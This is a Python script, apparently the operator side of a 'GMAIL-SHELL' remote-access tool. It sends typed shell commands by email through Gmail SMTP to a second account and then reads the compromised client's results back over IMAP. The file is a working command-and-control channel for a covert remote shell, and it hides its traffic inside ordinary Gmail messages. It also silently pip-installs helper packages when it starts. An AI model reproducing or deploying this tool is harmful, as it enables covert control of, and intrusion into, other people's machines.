import email
import os
import platform
import smtplib
import time
import imaplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
print("[*] Checking Requirements Module.....")
if platform.system().startswith("Linux"):
    try:
        import termcolor
    except ImportError:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from pystyle import *
    except:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style

elif platform.system().startswith("Windows"):
    try:
        import termcolor
    except ImportError:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
    try:
        from pystyle import *
    except:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *

colorama.deinit()
banner = Center.XCenter("""
*********************++++++++++++++++++*************************************
*    ______ __  __    _    ___ _         ____  _   _ _____ _     _   __    *
*   / / ___|  \/  |  / \  |_ _| |       / ___|| | | | ____| |   | |  \ \   *
*  | | |  _| |\/| | / _ \  | || |   ____\___ \| |_| |  _| | |   | |   | |  *
* < <| |_| | |  | |/ ___ \ | || |__|_____|__) |  _  | |___| |___| |___ > > *
*  | |\____|_|  |_/_/   \_\___|_____|   |____/|_| |_|_____|_____|_____| |  *
*   \_\                                                              /_/   *
*                       CODED BY:- github.com/machine1337                  *
**************************+++++++++++++++++++++*****************************
                            \n\n
""")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))

    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    smtp_username = "Your_1st_gmail@gmail.com"
    smtp_password = "Your_1st_gmail_app_password"

    
    imap_server = "imap.gmail.com"
    imap_username = "your_1st_gmail@gmail.com"
    imap_password = "Your_1st_gmail_app_password"
    imap_username_from_client = "your_2nd_gmail@gmail.com"

    from_email = imap_username
    to_email = imap_username_from_client
    subject = "Server Command"

    # create message container
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject


    while True:
        body = input(termcolor.colored("[*] Enter Command:- ",'green'))
        if body.lower() == 'exit':
            break
        msg.attach(MIMEText(body, 'plain'))
        try:
            session = smtplib.SMTP(smtp_server, smtp_port)
            session.starttls()
            session.login(smtp_username, smtp_password)
            text = msg.as_string()
            session.sendmail(from_email, to_email, text)
            session.quit()
            print(termcolor.colored("[*] Command Send Success....",'cyan'))
            print(termcolor.colored("[*] Wait For 10 Sec....For Better Result....",'yellow'))
            time.sleep(10)
            imap = imaplib.IMAP4_SSL(imap_server)
            imap.login(imap_username, imap_password)
            imap.select("inbox")
            status, messages = imap.search(None, "UNSEEN")
            latest_message = messages[0].split()[-1]
            _, email_data = imap.fetch(latest_message, "(RFC822)")
            email_message = email.message_from_bytes(email_data[0][1])
            for part in email_message.walk():
                if part.get_content_type() == "text/plain":
                    rep = part.get_payload(decode=True).decode()
                    print(termcolor.colored(f"[Client Result]: {rep}",'green'))
            imap.close()
            imap.logout()
            msg = MIMEMultipart()
            msg['From'] = from_email
            msg['To'] = to_email
            msg['Subject'] = subject

        except Exception as e:
            print(termcolor.colored(f"[+]Error sending email: {e}",'red'))
    print(termcolor.colored("[*] Some Shit Occured.....",'red'))
main()
